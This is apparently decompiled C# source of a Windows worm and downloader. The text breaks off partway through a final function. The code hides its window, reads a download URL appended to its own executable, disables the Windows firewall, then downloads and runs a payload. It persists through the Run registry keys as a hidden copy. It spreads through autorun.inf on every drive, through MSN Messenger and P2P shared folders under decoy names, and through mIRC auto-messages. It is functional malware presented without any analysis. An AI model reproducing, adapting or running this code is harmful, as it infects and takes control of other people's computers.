using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Server.My;

namespace Server;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private const string FileSplit = "|split|";

	private string stub;

	private string URL;

	private string[] opt;

	private RegistryKey RegKey;

	private int FuCk;

	private const int MAX_PATH = 260;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		FuCk = 300;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(19, 13);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(63, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetShortPathName([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszLongPath, StringBuilder lpszShortPath, int cchBuffer);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 312:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_0026;
						case 6:
							goto IL_0039;
						case 7:
							goto IL_004e;
						case 8:
							goto IL_0067;
						case 9:
							goto IL_007b;
						case 10:
							goto IL_0097;
						case 11:
							goto IL_00a9;
						case 12:
							goto IL_00be;
						case 13:
							goto IL_00c8;
						case 14:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00c8:
					num = 13;
					Timer1.set_Enabled(true);
					break;
					IL_00be:
					num = 12;
					Download();
					goto IL_00c8;
					IL_0009:
					num = 2;
					((Control)this).set_Visible(false);
					goto IL_0013;
					IL_0013:
					num = 3;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_001d;
					IL_001d:
					num = 4;
					((Control)this).Hide();
					goto IL_0026;
					IL_0026:
					num = 5;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_0039;
					IL_0039:
					num = 6;
					stub = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_004e;
					IL_004e:
					num = 7;
					FileSystem.FileGet(1, ref stub, -1L, false);
					goto IL_0067;
					IL_0067:
					num = 8;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_007b;
					IL_007b:
					num = 9;
					opt = Strings.Split(stub, "|split|", -1, (CompareMethod)0);
					goto IL_0097;
					IL_0097:
					num = 10;
					URL = opt[1];
					goto IL_00a9;
					IL_00a9:
					num = 11;
					TextBox1.set_Text(URL);
					goto IL_00be;
					end_IL_0001_2:
					break;
				}
				num = 14;
				_ = Assembly.GetExecutingAssembly().Location;
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 312;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		StartALL();
	}

	public void StartALL()
	{
		Timer1.set_Enabled(false);
		Thread.Sleep(FuCk);
		USB();
		Thread.Sleep(FuCk);
		install();
		Thread.Sleep(FuCk);
		Thread.Sleep(FuCk);
		MSN_Share_drop();
		Thread.Sleep(FuCk);
		p2p();
		Thread.Sleep(FuCk);
		ControalallPC();
		Thread.Sleep(FuCk);
		Timer1.set_Enabled(true);
	}

	public void Download()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 181:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_002f;
						case 6:
						case 7:
							goto IL_0037;
						case 8:
							goto IL_0054;
						case 9:
							goto IL_0060;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 11:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0060:
					num = 9;
					Process.Start(text);
					break;
					IL_0054:
					num = 8;
					Thread.Sleep(300);
					goto IL_0060;
					IL_0009:
					num = 2;
					DisableFirewall();
					goto IL_0011;
					IL_0011:
					num = 3;
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SkyNet.exe";
					goto IL_0025;
					IL_0025:
					num = 4;
					if (File.Exists(text))
					{
						goto IL_002f;
					}
					goto IL_0037;
					IL_002f:
					num = 5;
					File.Delete(text);
					goto IL_0037;
					IL_0037:
					num = 7;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(TextBox1.get_Text(), text);
					goto IL_0054;
					end_IL_0001_2:
					break;
				}
				num = 10;
				Thread.Sleep(300);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 181;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void MSN_Share_drop()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string fullyQualifiedName = default(string);
		string[] directories = default(string[]);
		Module module = default(Module);
		string fullyQualifiedName2 = default(string);
		string text = default(string);
		string text2 = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				int num7;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 376:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_003f;
						case 7:
							goto IL_005e;
						case 8:
							goto IL_007f;
						case 9:
							goto IL_0085;
						case 10:
							goto IL_0089;
						case 11:
							goto IL_0095;
						case 12:
							goto IL_00b0;
						case 13:
							goto IL_00d3;
						case 14:
							goto IL_00f0;
						case 15:
						case 16:
						case 17:
							goto IL_0109;
						default:
							goto end_IL_0001;
						case 18:
						case 19:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0109:
					num = 17;
					num5 = checked(num5 + 1);
					goto IL_00a6;
					IL_00f0:
					num = 14;
					File.Copy(fullyQualifiedName, directories[num5] + "\\LoVeGame.exe");
					goto IL_0109;
					IL_000a:
					num = 2;
					module = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_001a;
					IL_001a:
					num = 3;
					fullyQualifiedName2 = module.FullyQualifiedName;
					goto IL_0024;
					IL_0024:
					num = 4;
					text = Conversions.ToString(WorkingFolder(fullyQualifiedName2));
					goto IL_0035;
					IL_0035:
					num = 5;
					fullyQualifiedName = module.FullyQualifiedName;
					goto IL_003f;
					IL_003f:
					num = 6;
					text2 = text + "Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_005e;
					IL_005e:
					num = 7;
					if (Operators.CompareString(FileSystem.Dir(text2, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_007f;
					IL_007f:
					num = 8;
					num5 = 0;
					goto IL_0085;
					IL_0085:
					num = 9;
					goto IL_0089;
					IL_0089:
					num = 10;
					directories = Directory.GetDirectories(text2);
					goto IL_0095;
					IL_0095:
					num = 11;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_00a6;
					IL_00a6:
					num6 = num5;
					num7 = upperBound;
					if (num6 > num7)
					{
						goto end_IL_0001_2;
					}
					goto IL_00b0;
					IL_00b0:
					num = 12;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00d3;
					}
					goto IL_0109;
					IL_00d3:
					num = 13;
					if (!File.Exists(directories[num5] + "\\LoVeGame.exe"))
					{
						goto IL_00f0;
					}
					goto IL_0109;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 376;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void p2p()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string destFileName = default(string);
		int num5 = default(int);
		string text = default(string);
		string text2 = default(string);
		ArrayList arrayList = default(ArrayList);
		IEnumerator enumerator = default(IEnumerator);
		string folderPath = default(string);
		string[] directories = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 864:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0013;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_0047;
						case 6:
							goto IL_0061;
						case 7:
							goto IL_007c;
						case 8:
							goto IL_0096;
						case 9:
							goto IL_00b1;
						case 10:
							goto IL_00cd;
						case 11:
							goto IL_00e9;
						case 12:
							goto IL_0105;
						case 13:
							goto IL_0121;
						case 14:
							goto IL_013d;
						case 15:
							goto IL_0159;
						case 16:
							goto IL_0175;
						case 17:
							goto IL_0191;
						case 18:
							goto IL_01ad;
						case 19:
							goto IL_01c9;
						case 20:
							goto IL_01e5;
						case 21:
							goto IL_0201;
						case 24:
							goto IL_0211;
						case 25:
							goto IL_0226;
						case 26:
							goto IL_0235;
						case 27:
							goto IL_0241;
						case 28:
							goto IL_0259;
						case 29:
							goto IL_0291;
						case 30:
							goto IL_02a8;
						case 22:
						case 23:
						case 31:
						case 32:
							goto IL_02b6;
						default:
							goto end_IL_0001;
						case 33:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_0291:
					num = 29;
					File.Copy(Application.get_ExecutablePath(), destFileName, overwrite: true);
					num5 = checked(num5 + 1);
					goto IL_02a8;
					IL_0259:
					num = 28;
					destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + "-SkyNeSySteMs.exe";
					goto IL_0291;
					IL_000a:
					num = 2;
					arrayList = new ArrayList();
					goto IL_0013;
					IL_0013:
					num = 3;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads");
					goto IL_002d;
					IL_002d:
					num = 4;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder");
					goto IL_0047;
					IL_0047:
					num = 5;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared");
					goto IL_0061;
					IL_0061:
					num = 6;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder");
					goto IL_007c;
					IL_007c:
					num = 7;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads");
					goto IL_0096;
					IL_0096:
					num = 8;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads");
					goto IL_00b1;
					IL_00b1:
					num = 9;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\emule\\incoming\\");
					goto IL_00cd;
					IL_00cd:
					num = 10;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa\\my shared folder\\");
					goto IL_00e9;
					IL_00e9:
					num = 11;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite\\my shared folder\\");
					goto IL_0105;
					IL_0105:
					num = 12;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite k++\\my shared folder\\");
					goto IL_0121;
					IL_0121:
					num = 13;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\icq\\shared folder\\");
					goto IL_013d;
					IL_013d:
					num = 14;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\grokster\\my grokster\\");
					goto IL_0159;
					IL_0159:
					num = 15;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\bearshare\\shared\\");
					goto IL_0175;
					IL_0175:
					num = 16;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\edonkey2000\\incoming\\");
					goto IL_0191;
					IL_0191:
					num = 17;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\morpheus\\my shared folder\\");
					goto IL_01ad;
					IL_01ad:
					num = 18;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\limewire\\shared\\");
					goto IL_01c9;
					IL_01c9:
					num = 19;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\tesla\\files\\");
					goto IL_01e5;
					IL_01e5:
					num = 20;
					arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\winmx\\shared\\");
					goto IL_0201;
					IL_0201:
					num = 21;
					enumerator = arrayList.GetEnumerator();
					goto IL_02b6;
					IL_02b6:
					num = 23;
					if (!enumerator.MoveNext())
					{
						goto end_IL_0001_2;
					}
					goto IL_0211;
					IL_0211:
					num = 24;
					text = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
					goto IL_0226;
					IL_0226:
					num = 25;
					if (Directory.Exists(text))
					{
						goto IL_0235;
					}
					goto IL_02b6;
					IL_0235:
					num = 26;
					folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					goto IL_0241;
					IL_0241:
					num = 27;
					directories = Directory.GetDirectories(folderPath);
					num5 = 0;
					goto IL_02ac;
					IL_02ac:
					if (num5 < directories.Length)
					{
						text2 = directories[num5];
						goto IL_0259;
					}
					goto IL_02b6;
					IL_02a8:
					num = 30;
					goto IL_02ac;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 864;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public object mIRC_Spread(ref string SpreadMSG)
	{
		if (File.Exists(Interaction.Environ("AppData") + "\\mIRC\\scripts\\remote.ini"))
		{
			try
			{
				StreamWriter streamWriter = File.CreateText(Interaction.Environ("AppData") + "\\mIRC\\scripts\\remote.ini");
				streamWriter.WriteLine("[script]");
				streamWriter.WriteLine("n0=on 1:JOIN:#:/privmsg $nick " + SpreadMSG);
				streamWriter.Close();
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = false;
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return false;
	}

	public string GetShortFileName(string LongPath)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StringBuilder stringBuilder = default(StringBuilder);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0017;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0017:
					num = 3;
					GetShortPathName(ref LongPath, stringBuilder, stringBuilder.Capacity);
					break;
					IL_0009:
					num = 2;
					stringBuilder = new StringBuilder(260);
					goto IL_0017;
					end_IL_0001_2:
					break;
				}
				num = 4;
				text = stringBuilder.ToString();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void mIRC_Spread()
	{
		throw new NotImplementedException();
	}

	public object WorkingFolder(string arg)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text2 = default(string);
		string text = default(string);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 99:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					text2 = Strings.Mid(arg, 1, checked((int)Math.Round(Conversion.Val(text))));
					break;
					IL_0009:
					num = 2;
					text = Conversions.ToString(Strings.InStrRev(arg, "\\", -1, (CompareMethod)0));
					goto IL_001f;
					end_IL_0001_2:
					break;
				}
				num = 4;
				obj = text2;
				break;
				end_IL_0001:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0001_dispatch = 99;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void DisableFirewall()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		string fileName = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 291:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_002e;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_004c;
						case 8:
							goto IL_005b;
						case 9:
							goto IL_006a;
						case 10:
							goto IL_0075;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_0099;
						case 13:
							goto IL_00b4;
						case 14:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00b4:
					num = 13;
					RegKey.Flush();
					break;
					IL_0099:
					num = 12;
					RegKey.SetValue("EnableFirewall", 0, RegistryValueKind.DWord);
					goto IL_00b4;
					IL_0009:
					num = 2;
					process = new Process();
					goto IL_0012;
					IL_0012:
					num = 3;
					fileName = "netsh.exe";
					goto IL_001b;
					IL_001b:
					num = 4;
					process.StartInfo.Arguments = "firewall set opmode disable";
					goto IL_002e;
					IL_002e:
					num = 5;
					process.StartInfo.FileName = fileName;
					goto IL_003d;
					IL_003d:
					num = 6;
					process.StartInfo.UseShellExecute = false;
					goto IL_004c;
					IL_004c:
					num = 7;
					process.StartInfo.RedirectStandardOutput = true;
					goto IL_005b;
					IL_005b:
					num = 8;
					process.StartInfo.CreateNoWindow = true;
					goto IL_006a;
					IL_006a:
					num = 9;
					process.Start();
					goto IL_0075;
					IL_0075:
					num = 10;
					process.WaitForExit();
					goto IL_007f;
					IL_007f:
					num = 11;
					RegKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", writable: true);
					goto IL_0099;
					end_IL_0001_2:
					break;
				}
				num = 14;
				RegKey.Close();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 291;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void install()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		RegistryKey registryKey2 = default(RegistryKey);
		string text = default(string);
		FileAttribute val = default(FileAttribute);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 218:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_000f;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_0032;
						case 6:
						case 7:
							goto IL_0040;
						case 8:
							goto IL_004a;
						case 9:
							goto IL_005e;
						case 10:
							goto IL_006e;
						case 11:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 12:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_006e:
					num = 10;
					registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					break;
					IL_005e:
					num = 9;
					registryKey2.SetValue("SkyNeSySteMs", text);
					goto IL_006e;
					IL_000a:
					num = 2;
					val = (FileAttribute)7;
					goto IL_000f;
					IL_000f:
					num = 3;
					text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SkyNeSySteMsCoderSs.exe";
					goto IL_0024;
					IL_0024:
					num = 4;
					if (!File.Exists(text))
					{
						goto IL_0032;
					}
					goto IL_0040;
					IL_0032:
					num = 5;
					File.Copy(Application.get_ExecutablePath(), text);
					goto IL_0040;
					IL_0040:
					num = 7;
					FileSystem.SetAttr(text, val);
					goto IL_004a;
					IL_004a:
					num = 8;
					registryKey2 = Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
					goto IL_005e;
					end_IL_0001_2:
					break;
				}
				num = 11;
				registryKey.SetValue("SaefLoveSoSo", text);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 218;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void USB()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				if (!File.Exists(programFiles + "windows.exe"))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, programFiles + "windows.exe");
				}
				StreamWriter streamWriter = new StreamWriter(programFiles + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("open = windows.exe");
				streamWriter.WriteLine("shellexecute=windows.exe");
				streamWriter.Close();
				File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
				File.SetAttributes(programFiles + "windows.exe", FileAttributes.Hidden);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void ControalallPC()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		RegistryKey registryKey = default(RegistryKey);
		RegistryKey registryKey2 = default(RegistryKey);
		RegistryKey registryKey3 = default(RegistryKey);
		RegistryKey registryKey4 = default(RegistryKey);
		RegistryKey registryKey5 = default(RegistryKey);
		RegistryKey registryKey6 = default(RegistryKey);
